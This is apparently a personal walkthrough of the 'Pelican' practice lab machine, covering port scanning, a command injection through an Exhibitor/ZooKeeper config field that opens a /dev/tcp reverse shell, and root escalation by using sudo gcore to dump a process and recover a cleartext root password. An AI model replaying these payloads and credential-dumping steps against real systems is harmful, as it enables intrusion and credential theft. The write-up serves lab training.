# Pelican

# Enumeration

## nmap

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Pelican]
└─$ rustscan -a 192.168.143.98 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.143.98:22
Open 192.168.143.98:445
Open 192.168.143.98:631
Open 192.168.143.98:139
Open 192.168.143.98:2181
Open 192.168.143.98:2222
Open 192.168.143.98:40837
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-02 10:54 EST
Initiating Ping Scan at 10:54
Scanning 192.168.143.98 [2 ports]
Completed Ping Scan at 10:54, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:54
Completed Parallel DNS resolution of 1 host. at 10:54, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:54
Scanning 192.168.143.98 [7 ports]
Discovered open port 139/tcp on 192.168.143.98
Discovered open port 445/tcp on 192.168.143.98
Discovered open port 22/tcp on 192.168.143.98
Discovered open port 40837/tcp on 192.168.143.98
Discovered open port 2181/tcp on 192.168.143.98
Discovered open port 631/tcp on 192.168.143.98
Discovered open port 2222/tcp on 192.168.143.98
Completed Connect Scan at 10:54, 0.18s elapsed (7 total ports)
Nmap scan report for 192.168.143.98
Host is up, received conn-refused (0.18s latency).
Scanned at 2022-02-02 10:54:15 EST for 0s

PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
631/tcp   open  ipp          syn-ack
2181/tcp  open  eforward     syn-ack
2222/tcp  open  EtherNetIP-1 syn-ack
40837/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Pelican]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -O -sC 192.168.143.98 -p 22,445,631,139,2181,2222,40837                                                                                      130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-02 10:54 EST
Nmap scan report for 192.168.143.98
Host is up (0.18s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|_  256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
40837/tcp open  java-rmi    Java RMI
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (90%), Linux 5.4 (90%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 2.6.18 (90%), Linux 3.2.0 (90%), Synology DiskStation Manager 5.1 (90%), Linux 2.6.35 (89%), Tomato 1.27 - 1.28 (Linux 2.4.20) (89%), Linux 2.6.39 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h38m38s, deviation: 2h53m13s, median: -1m21s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2022-02-02T10:53:46-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-02T15:53:49
|_  start_date: N/A

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   181.06 ms 192.168.49.1
2   181.19 ms 192.168.143.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.28 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

## 22 - SSH

## 139,445 - Samba

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 192.168.143.98 -P 445 -R 
[+] IP: 192.168.143.98:445      Name: 192.168.143.98                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## 2181 - Zookeeper

## 2222 - SSH

## 40837 - Java RMI


# Exploitation

https://www.google.com/search?q=zookeeper+exploit&rlz=1C1ONGR_enSG945SG945&sxsrf=APq-WBv0Qac6GGWA5coHnvIpc2bYNA9v0A%3A1643818168308&ei=uKz6YYOVEsGaseMPo5e6mAo&oq=zoo&gs_lcp=Cgdnd3Mtd2l6EAMYATIECCMQJzIECCMQJzIECCMQJzIECAAQQzINCC4QsQMQxwEQ0QMQQzIECAAQQzIHCAAQsQMQQzIHCAAQsQMQQzIHCAAQsQMQQzIHCAAQsQMQQzoHCCMQsAMQJzoHCAAQRxCwAzoOCC4QgAQQsQMQxwEQ0QM6CAgAELEDEIMBOggIABCABBCxAzoICC4QgAQQsQM6DgguEIAEELEDEMcBEKMCSgQIQRgASgQIRhgAULcHWJkKYNwTaAJwAngAgAFoiAG0ApIBAzAuM5gBAKABAcgBCcABAQ&sclient=gws-wiz
https://www.exploit-db.com/exploits/48654


```
┌──(kali㉿kali)-[/tmp/remote-method-guesser]
└─$ sudo nmap -sV -A -O -sC 192.168.143.98 -p 8080 -Pn                                                                                                            127 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-02 11:09 EST
Nmap scan report for 192.168.143.98
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 (91%), Linux 4.15 - 5.6 (90%), Linux 5.0 (90%), Linux 2.6.32 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%), Linux 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   184.56 ms 192.168.49.1
2   184.82 ms 192.168.143.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.29 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/remote-method-guesser]
└─$ 
```


```
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST -d @data.json http://192.168.143.98:8080/exhibitor/v1/config/set                                                                                   1 ⚙
{"message":"OK","succeeded":true}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat data.json                                                                                                                                                   1 ⚙
{ "zookeeperInstallDirectory": "/opt/zookeeper", "zookeeperDataDirectory": "/opt/zookeeper/snapshots", "zookeeperLogDirectory": "/opt/zookeeper/transactions", "logIndexDirectory": "/opt/zookeeper/transactions", "autoManageInstancesSettlingPeriodMs": "0", "autoManageInstancesFixedEnsembleSize": "0", "autoManageInstancesApplyAllAtOnce": "1", "observerThreshold": "0", "serversSpec": "1:exhibitor-demo", "javaEnvironment": "$(/bin/sh -i >& /dev/tcp/192.168.49.143/2181 0>&1 &)", "log4jProperties": "", "clientPort": "2181", "connectPort": "2888", "electionPort": "3888", "checkMs": "30000", "cleanupPeriodMs": "300000", "cleanupMaxFiles": "20", "backupPeriodMs": "600000", "backupMaxStoreMs": "21600000", "autoManageInstances": "1", "zooCfgExtra": { "tickTime": "2000", "initLimit": "10", "syncLimit": "5", "quorumListenOnAllIPs": "true" }, "backupExtra": { "directory": "" }, "serverId": 1 }
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$   
```

```
┌──(kali㉿kali)-[/tmp/remote-method-guesser]
└─$ sudo nc -nlvp 2181                                                                                                                                              1 ⨯
listening on [any] 2181 ...
connect to [192.168.49.143] from (UNKNOWN) [192.168.143.98] 43570
whoami
charles
pwd
/opt/zookeeper
cd /home
ls
charles
cd charles
ls
local.txt
cat local.txt
d21f6f94619e21a257921f71f562756a
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.143.98  netmask 255.255.255.0  broadcast 192.168.143.255
        ether 00:50:56:ba:8c:d3  txqueuelen 1000  (Ethernet)
        RX packets 123990  bytes 9812053 (9.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 122154  bytes 7511190 (7.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 13662  bytes 867728 (847.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13662  bytes 867728 (847.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

![](Pasted%20image%2020220203001505.png)
# Gcore Privesc
```
python -c 'import pty; pty.spawn("/bin/bash")'
charles@pelican:/tmp$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
charles@pelican:/tmp$ 
```

https://www.pentestingmadesimple.it/oscp-preparation-file-upload-gcore-privesc/

```
charles@pelican:/tmp$ ps aux | grep root
ps aux | grep root
root         1  0.0  0.5 104032 10420 ?        Ss   10:48   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    10:48   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   10:48   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   10:48   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   10:48   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   10:48   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    10:48   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    10:48   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        I    10:48   0:00 [rcu_bh]
root        12  0.0  0.0      0     0 ?        S    10:48   0:00 [migration/0]
root        13  0.0  0.0      0     0 ?        I    10:48   0:00 [kworker/0:1-events]
root        14  0.0  0.0      0     0 ?        S    10:48   0:00 [cpuhp/0]
root        15  0.0  0.0      0     0 ?        S    10:48   0:00 [kdevtmpfs]
root        16  0.0  0.0      0     0 ?        I<   10:48   0:00 [netns]
root        17  0.0  0.0      0     0 ?        S    10:48   0:00 [kauditd]
root        18  0.0  0.0      0     0 ?        S    10:48   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S    10:48   0:00 [oom_reaper]
root        20  0.0  0.0      0     0 ?        I<   10:48   0:00 [writeback]
root        21  0.0  0.0      0     0 ?        S    10:48   0:00 [kcompactd0]
root        22  0.0  0.0      0     0 ?        SN   10:48   0:00 [ksmd]
root        23  0.0  0.0      0     0 ?        SN   10:48   0:00 [khugepaged]
root        24  0.0  0.0      0     0 ?        I<   10:48   0:00 [crypto]
root        25  0.0  0.0      0     0 ?        I<   10:48   0:00 [kintegrityd]
root        26  0.0  0.0      0     0 ?        I<   10:48   0:00 [kblockd]
root        27  0.0  0.0      0     0 ?        I<   10:48   0:00 [edac-poller]
root        28  0.0  0.0      0     0 ?        I<   10:48   0:00 [devfreq_wq]
root        29  0.0  0.0      0     0 ?        S    10:48   0:00 [watchdogd]
root        30  0.0  0.0      0     0 ?        S    10:48   0:00 [kswapd0]
root        48  0.0  0.0      0     0 ?        I<   10:48   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/24-pciehp]
root        50  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/25-pciehp]
root        51  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/26-pciehp]
root        52  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/27-pciehp]
root        53  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/28-pciehp]
root        54  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/29-pciehp]
root        55  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/30-pciehp]
root        56  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/31-pciehp]
root        57  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/32-pciehp]
root        58  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/33-pciehp]
root        59  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/34-pciehp]
root        60  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/35-pciehp]
root        61  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/36-pciehp]
root        62  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/37-pciehp]
root        63  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/38-pciehp]
root        64  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/39-pciehp]
root        65  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/40-pciehp]
root        66  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/41-pciehp]
root        67  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/42-pciehp]
root        68  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/43-pciehp]
root        69  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/44-pciehp]
root        70  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/45-pciehp]
root        71  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/46-pciehp]
root        72  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/47-pciehp]
root        73  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/48-pciehp]
root        74  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/49-pciehp]
root        75  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/50-pciehp]
root        76  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/51-pciehp]
root        77  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/52-pciehp]
root        78  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/53-pciehp]
root        79  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/54-pciehp]
root        80  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/55-pciehp]
root        81  0.0  0.0      0     0 ?        I<   10:48   0:00 [kstrp]
root       122  0.0  0.0      0     0 ?        S    10:48   0:00 [scsi_eh_0]
root       123  0.0  0.0      0     0 ?        I<   10:48   0:00 [scsi_tmf_0]
root       125  0.0  0.0      0     0 ?        I<   10:48   0:00 [vmw_pvscsi_wq_0]
root       128  0.0  0.0      0     0 ?        I<   10:48   0:00 [ata_sff]
root       129  0.0  0.0      0     0 ?        S    10:48   0:00 [scsi_eh_1]
root       131  0.0  0.0      0     0 ?        I<   10:48   0:00 [scsi_tmf_1]
root       133  0.0  0.0      0     0 ?        S    10:48   0:00 [scsi_eh_2]
root       134  0.0  0.0      0     0 ?        I<   10:48   0:00 [kworker/0:1H-kblockd]
root       136  0.0  0.0      0     0 ?        I<   10:48   0:00 [scsi_tmf_2]
root       138  0.0  0.0      0     0 ?        I    10:48   0:00 [kworker/u2:2-events_unbound]
root       147  0.0  0.0      0     0 ?        I<   10:48   0:00 [ttm_swap]
root       149  0.0  0.0      0     0 ?        S    10:48   0:00 [irq/16-vmwgfx]
root       221  0.0  0.0      0     0 ?        I<   10:48   0:00 [kworker/u3:0]
root       223  0.0  0.0      0     0 ?        S    10:48   0:00 [jbd2/sda1-8]
root       224  0.0  0.0      0     0 ?        I<   10:48   0:00 [ext4-rsv-conver]
root       259  0.0  0.4  43088  8924 ?        Ss   10:48   0:00 /lib/systemd/systemd-journald
root       281  0.0  0.3  23836  6388 ?        Ss   10:48   0:00 /lib/systemd/systemd-udevd
root       293  0.0  0.5  48368 10788 ?        Ss   10:48   0:00 /usr/bin/VGAuthService
root       306  0.0  0.6 123172 12612 ?        Ssl  10:48   0:01 /usr/bin/vmtoolsd
root       456  0.0  0.1   8504  2588 ?        Ss   10:48   0:00 /usr/sbin/cron -f
root       457  0.0  0.8 332776 18044 ?        Ssl  10:48   0:00 /usr/sbin/NetworkManager --no-daemon
root       458  0.0  0.3  19532  7300 ?        Ss   10:48   0:00 /lib/systemd/systemd-logind
root       462  0.0  0.2 225824  4344 ?        Ssl  10:48   0:00 /usr/sbin/rsyslogd -n -iNONE
root       463  0.0  0.4 318340 10176 ?        Ssl  10:48   0:00 /usr/sbin/ModemManager --filter-policy=strict
root       464  0.0  0.5 398424 11976 ?        Ssl  10:48   0:00 /usr/lib/udisks2/udisksd
root       467  0.0  0.2  19768  5152 ?        Ss   10:48   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       471  0.0  0.1   9468  2480 ?        S    10:48   0:00 /usr/sbin/CRON -f
root       479  0.0  0.0   2388  1572 ?        Ss   10:48   0:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
avahi      491  0.0  0.0   8156   320 ?        S    10:48   0:00 avahi-daemon: chroot helper
root       495  0.0  0.0   2276    72 ?        Ss   10:48   0:00 /usr/bin/password-store
root       498  0.0  0.4 235840  8824 ?        Ssl  10:48   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       555  0.0  0.3 313364  6920 ?        Ssl  10:48   0:00 /usr/sbin/lightdm
root       583  0.0  0.3  15852  7112 ?        Ss   10:48   0:00 /usr/sbin/sshd -D
root       595  0.0  0.0   5612  1652 tty1     Ss+  10:48   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       596  0.0  2.2 224980 46256 tty7     Ssl+ 10:48   0:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root       623  0.0  0.0  69740  1704 ?        Ss   10:48   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root       656  0.0  0.3 166792  7152 ?        Sl   10:48   0:00 lightdm --session-child 18 21
root       722  0.0  0.2  18748  5236 ?        S    10:48   0:00 lightdm --session-child 14 21
root      1313  0.0  1.0  50152 21244 ?        Ss   10:50   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1315  0.0  0.2  46672  5964 ?        S    10:50   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1316  0.0  0.2  46680  6000 ?        S    10:50   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1321  0.0  0.3  50136  7244 ?        S    10:50   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1629  0.0  0.4 105188  9820 ?        Ssl  10:50   0:00 /usr/sbin/cupsd -l
root      1630  0.0  0.5 185104 11148 ?        Ssl  10:50   0:00 /usr/sbin/cups-browsed
root      9219  0.0  0.0      0     0 ?        I    11:18   0:00 [kworker/u2:6-events_unbound]
root      9500  0.0  0.0      0     0 ?        I    11:19   0:00 [kworker/0:2-ata_sff]
charles   9608  0.2  3.1 2546756 65036 ?       Sl   11:19   0:00 java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE -cp /opt/zookeeper/bin/../build/classes:/opt/zookeeper/bin/../build/lib/*.jar:/opt/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/opt/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/opt/zookeeper/bin/../lib/netty-3.7.0.Final.jar:/opt/zookeeper/bin/../lib/log4j-1.2.16.jar:/opt/zookeeper/bin/../lib/jline-0.9.94.jar:/opt/zookeeper/bin/../zookeeper-3.4.6.jar:/opt/zookeeper/bin/../src/java/lib/*.jar:/opt/zookeeper/bin/../conf: -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/bin/../conf/zoo.cfg
root     10783  0.0  0.0      0     0 ?        I    11:24   0:00 [kworker/0:0-mm_percpu_wq]
root     10930  0.0  0.0   5260   684 ?        S    11:25   0:00 sleep 1
root     10931  0.0  0.5  50300 11608 ?        S    11:25   0:00 /usr/sbin/smbd --foreground --no-process-group
charles  10933  0.0  0.0   6076   880 pts/0    S+   11:25   0:00 grep root
charles@pelican:/tmp$
charles@pelican:/tmp$ sudo gcore 495
sudo gcore 495
0x00007f50a9fce6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffccf6689b0, remaining=remaining@entry=0x7ffccf6689b0) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.495
[Inferior 1 (process 495) detached]
charles@pelican:/tmp$ strings core.495
strings core.495
CORE
password-store
/usr/bin/password-store 
CORE
CORE
k73V
k73V
k73V
k73V
k73V
k73V
k73V
i73V
/usr/bin/passwor
////////////////
v=73V
%v=73V
1v=73V
LINUX
/usr/bin/passwor
////////////////
IGISCORE
CORE
ELIFCORE
/usr/bin/password-store
/usr/bin/password-store
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
fork failed!
/tmp
;*3$"
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
;*3$"
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
/usr/bin/passwor
/usr/bin/passwor
////////////////
/usr/bin
////////////////
001 Password: root:
ClogKingpinInning731
x86_64
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
/usr/bin/password-store
bemX
__vdso_clock_gettime
__vdso_gettimeofday
__vdso_time
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
4.19.0-10-amd64
AVAUATSH
[A\A]A^]
D9+u
[A\A]A^]
D9#u
H+=x
H#=y
H+=K
H#=L
AVAUATI
[A\A]A^]
GCC: (Debian 8.3.0-6) 8.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
.shstrtab
note0
load
charles@pelican:/tmp$ su root
su root
Password: ClogKingpinInning731

root@pelican:/tmp# cd /root
cd /root
root@pelican:~# cat proof.txt
cat proof.txt
bcdf49abad8885b3e049b22c93aa1647
root@pelican:~# ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.143.98  netmask 255.255.255.0  broadcast 192.168.143.255
        ether 00:50:56:ba:8c:d3  txqueuelen 1000  (Ethernet)
        RX packets 203073  bytes 16496353 (15.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 195738  bytes 18975766 (18.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 14050  bytes 891943 (871.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14050  bytes 891943 (871.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@pelican:~# 
```

![](Pasted%20image%2020220203003250.png)

# Others